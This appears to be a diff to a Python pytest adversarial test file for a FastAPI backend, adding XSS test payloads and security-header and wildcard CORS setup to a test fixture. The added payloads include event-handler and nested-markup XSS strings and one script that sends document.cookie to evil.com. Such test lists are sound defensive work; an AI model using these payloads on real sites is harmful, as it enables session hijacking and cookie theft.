@@ -9,6 +9,14 @@ XSS_PAYLOADS = [
     "<svg onload=alert(1)>",
     "javascript:alert(1)",
     '"><script>alert(1)</script>',
+    # 扩展 payload
+    "<body onload=alert(1)>",
+    "<details open ontoggle=alert(1)>",
+    "<input onfocus=alert(1) autofocus>",
+    "<marquee onstart=alert(1)>",
+    "<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>",
+    '"><img src=x onerror=alert(1)>',
+    "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>",
 ]
 
 SQLI_PAYLOADS = [
@@ -48,13 +56,15 @@ JWT_WRONG_SECRET = (
 @pytest.fixture
 async def adversarial_app(db_container):
     from fastapi import FastAPI
-    from backend.core.middleware import register_error_handlers
+    from backend.core.middleware import register_error_handlers, setup_security_headers, setup_cors
     from backend.plugins.auth.middleware import AuthMiddleware
 
     app = FastAPI(title="Test Arche")
     app.state.container = db_container
 
     register_error_handlers(app)
+    setup_security_headers(app)
+    setup_cors(app, ["*"])
 
     from backend.plugins.auth.routes import router as auth_router
     from backend.plugins.blog.routes import router as blog_router
